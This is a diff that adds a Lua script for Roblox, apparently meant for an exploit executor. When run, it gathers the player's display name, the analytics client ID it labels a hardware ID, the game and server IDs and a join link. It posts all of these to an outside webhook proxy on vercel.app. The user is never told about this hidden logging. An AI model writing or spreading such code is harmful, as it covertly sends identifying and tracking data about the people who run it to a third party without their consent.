@@ -1,0 +1,98 @@
+local players = game:GetService("Players")
+local httpService = game:GetService("HttpService")
+local rbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local marketplaceService = game:GetService("MarketplaceService")
+
+local function f1()
+    local displayName = players.LocalPlayer.DisplayName
+    local getClientId = rbxAnalyticsService:GetClientId()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+
+    local v1, v2 = pcall(function()
+        return marketplaceService:GetProductInfo(placeId).Name
+    end)
+
+    local value
+
+    if v1 then
+        value = v2
+    else
+        value = "Unknown Game"
+        warn("Failed to get game name: " .. tostring(v2))
+    end
+
+    local function safe(v)
+        if v == nil then
+            return "Unknown"
+        end
+        return tostring(v)
+    end
+
+    local v3 = {
+        content = "Script executed",
+        embeds = {
+            {
+                title = "**Your script has been executed!**",
+                description = safe(displayName) .. " has executed the script.",
+                type = "rich",
+                color = 16777215,
+                fields = {
+                    {
+                        name = "Hardware ID:",
+                        value = safe(getClientId),
+                        inline = true
+                    },
+                    {
+                        name = "Game Name:",
+                        value = safe(value),
+                        inline = true
+                    },
+                    {
+                        name = "Game ID:",
+                        value = safe(placeId),
+                        inline = true
+                    },
+                    {
+                        name = "Server ID:",
+                        value = safe(jobId),
+                        inline = true
+                    },
+                    {
+                        name = "Join Link:",
+                        value = "roblox://placeID=" .. safe(placeId)
+                            .. "&gameInstanceId=" .. safe(jobId),
+                        inline = false
+                    }
+                }
+            }
+        }
+    }
+
+    local v4, v5 = pcall(function()
+        return request({
+            Url = "https://roblox-webhook-proxy-vercel.vercel.app/send",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Authorization"] = "SkidoOnTop"
+            },
+            Body = httpService:JSONEncode(v3)
+        })
+    end)
+
+    if v4 then
+        print("Webhook Status:", v5.StatusCode)
+        print("Webhook Response:", v5.Body)
+
+        if v5.StatusCode == 200 then
+            print("Thanks for supporting us")
+        else
+            warn("Webhook failed: " .. tostring(v5.Body))
+        end
+    else
+        warn("Webhook failed: " .. tostring(v5))
+    end
+end
+
+f1()
